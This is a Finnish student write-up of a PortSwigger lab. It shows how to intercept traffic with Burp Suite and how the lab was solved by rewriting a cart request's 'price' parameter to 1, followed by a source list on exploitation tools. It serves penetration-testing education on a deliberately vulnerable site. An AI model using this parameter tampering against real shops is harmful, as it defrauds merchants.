Päätin kokeilla Burp suite:a, jonka proxy ominaisuus antaa siepata/keskeyttää HTTP-pyyntöjä Burp:n selaimen ja kohdeserverin välillä. Tämä työkalu auttaa tutkimaan, kuinka verkkosivu toimii, kun siellä tehdää erilaisia toimintoja, esim. kirjautuminen, painikkeen klikkaaminen jne. Testinä kokeilin Portswiggerin omaa verkkosivua. *([Portswigger - Getting Started](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic))* Kalissa Burp on valmiiksi asennettuna, joten käynnistin sen normaalisti sovellusvalikosta. Sain varoitukseksi: "Your JRE appears to be version 17.0.9 from Debian, Burp has not been fully tested on this platform and you may experience problems.". Portswiggerin mukaan tämä on kuitenkin varoitus, jonka voi ohittaa toistaiseksi. Valitsin väliaikaisen projektin ja käytin Burpin oletusasetuksia:

![temporary](https://github.com/jjenska/PenTest/assets/105623785/eddcbe35-3656-4eef-9d98-2b64f474ba8b)

Sitten navigoin välilehdelle "proxy" -> "intercept" -> painoin painiketta "intercept is off" -> "intercept is on". Avasin selaimen Burp:n kautta ja asetin osoitteeksi `https://portswigger.net`. Koska liikenteen kaappaus oli päällä, ei verkkosivu avatutunut laisinkaan, vaan jäi lataamaan.

![intercept](https://github.com/jjenska/PenTest/assets/105623785/469800e1-e598-4e37-a460-ac9ba2ff88b4)

Tämän jälkeen painoin ylhällä olevaa ```forward``` painiketta, jotta sain liikennettä eteenpäin ja sivun latautumaan. Kun siirryin välilehdelle "HTTP history", näin GET-pyyntöjä palveluun. Sitten siirryin testaamaan tarkoituksella haavoittuvaksi tehtyä websovellusta, joka tuli vastaan jo tehtävässä h1. Ensin asetin "intercept is off", jotta verkkoliikenne pääsee läpi. Tämän jälkeen avasin: `https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls`, josta klikkasin "access the lab". Tämä pyysi minulta tunnukset, jotka olin jo luonut palveluun aikaisemmin. 

Kirjautumisen jälkeen klikkasin "My account" ja kirjauduin sisään feikkitunnuksilla (username: wiener password: peter). Näin sain käyttööni 100$ rahaa.

![myacc](https://github.com/jjenska/PenTest/assets/105623785/2f164905-9c3e-4616-9c56-5c9fd86b5526)

Tämän jälkeen siirryin takaisin etusivulle ja klikkasin tuotteen "Lightweight l33t Leather Jacket" lisätiedot. Burp suite:sta asetin "intercept is on", jonka jälkeen siirsin tuotteen ostoskoriin. Tämän jälkeen sain POST-pyynnön näkyviin Burp:iin. Rivillä 23 muokkasin parametrin "price" arvoksi 1. Sen jälkeen "forward" ja intercept takaisin pois päältä, jotta verkkosivua voi selailla normaalisti. 

![price](https://github.com/jjenska/PenTest/assets/105623785/f2643385-6fbe-427e-afdd-be729add8465)

![placeorder](https://github.com/jjenska/PenTest/assets/105623785/4c143876-7f5a-4ef5-b333-cad819273818)

Ostoskorissani näkyi nyt päivitetty hinta, tein tilauksen ja "Lab solved".

# Lähteet

[Boom CMS v8.0.7 - Cross Site Scripting](https://www.exploit-db.com/exploits/51612)

[ExploitDB - searchsploit](https://www.exploit-db.com/searchsploit)

[GitHub - jatcwang: layouts](https://gist.github.com/jatcwang/ae3b7019f219b8cdc6798329108c9aee)

[GitHub - Nikto: Basic Testing](https://github.com/sullo/nikto/wiki/Basic-Testing)

[GitHub - Nikto: Export Formats](https://github.com/sullo/nikto/wiki/Export-Formats)

[GitHub - Nikto: Install Unix](https://github.com/sullo/nikto/wiki/Install-Unix)

[GitHub - Nikto: Special Notes](https://github.com/sullo/nikto/wiki/Kali-%28Special-Notes%29)

[GitHub - Riku](https://github.com/rikurikurikuriku/PenTestCourse/wiki/H2-Turbo-Mode)

[Hacktricks - XPATH injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection)

[infosecwriteups - upgrade normal shell to meterpreter](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646)

[Kali - Get Kali](https://www.kali.org/get-kali/#kali-virtual-machines)

[Kali - Default Credentials](https://www.kali.org/docs/introduction/default-credentials/)

[Kali - Starting MFS](https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/#msfdb)

[Metasploit - Docs](https://docs.metasploit.com/docs/pentesting/metasploit-guide-setting-module-options.html)

[Portswigger - Getting Started](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic)

[rapid7 - Metasploitable docs](https://docs.rapid7.com/metasploit/metasploitable-2)

[Sourceforge](https://sourceforge.net/projects/metasploitable/)

[Tero Karvinen - h3](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h3-lab-kid)

[OWASP - attacks: xss](https://owasp.org/www-community/attacks/xss/)
